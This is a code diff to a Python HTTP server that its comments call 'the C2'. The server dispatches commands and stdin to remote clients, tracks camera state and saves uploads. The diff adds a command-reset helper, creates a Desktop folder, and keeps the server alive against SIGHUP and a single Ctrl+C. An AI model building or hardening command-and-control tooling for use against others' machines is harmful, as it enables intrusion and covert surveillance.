@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.1.5"
+VERSION = "3.2.0"
 
 # ── Auth ─────────────────────────────────────────────────────────────────────
 # Set TOKEN to any hard-to-guess string (e.g. a random UUID).
@@ -97,6 +97,18 @@ def get_or_create_client(client_id):
 def set_command(client, cmd):
     client["pending_command"] = cmd
     client["cmd_event"].set()
+
+
+def clear_command(client):
+    """Reset pending/running command state for a client.
+
+    Referenced by cancel_shortcut (Ctrl+\\) — was missing, which made the
+    shortcut raise NameError instead of cancelling. Must be called with lock held."""
+    client["command_running"] = False
+    client["interactive"] = False
+    client["pending_command"] = None
+    client["pending_stdin"] = []
+    client["cmd_event"].clear()
 
 
 def clear_camera_state(client_id):
@@ -545,6 +557,7 @@ class Handler(BaseHTTPRequestHandler):
             # Read raw bytes
             raw_bytes = raw_body_bytes
             desktop = os.path.expanduser("~/Desktop")
+            os.makedirs(desktop, exist_ok=True)  # headless boxes may have no Desktop yet
             dest = os.path.join(desktop, filename)
             try:
                 with open(dest, "wb") as f:
@@ -1080,7 +1093,29 @@ if __name__ == "__main__":
     threading.Thread(target=result_printer, daemon=True).start()
     threading.Thread(target=status_printer, daemon=True).start()
 
+    # --- Connection resilience ---
+    # SIGHUP: ignore, so a detached tmux/SSH parent dying cannot kill the C2.
     try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\n[*] Server stopped.")
+        signal.signal(signal.SIGHUP, signal.SIG_IGN)
+    except (AttributeError, OSError, ValueError):
+        pass  # non-POSIX platform
+    # SIGINT (Ctrl+C): one accidental press must not drop the whole C2
+    # (observed incident: single stray Ctrl+C -> process exit -> every client
+    # behind the tunnel got 502 for minutes/hours). Require a second Ctrl+C
+    # within 2 seconds to actually stop.
+    first_interrupt_at = 0.0
+    while True:
+        try:
+            server.serve_forever()
+            break  # normal return (shutdown() called from another thread)
+        except KeyboardInterrupt:
+            now = time.time()
+            if first_interrupt_at and (now - first_interrupt_at) <= 2.0:
+                print("\n[*] Server stopped (confirmed by second Ctrl+C).")
+                break
+            first_interrupt_at = now
+            print(
+                "\n[!] Ctrl+C caught — server keeps running (clients stay connected)."
+                "\n[!] Press Ctrl+C again within 2 seconds to really stop it."
+            )
+    server.server_close()
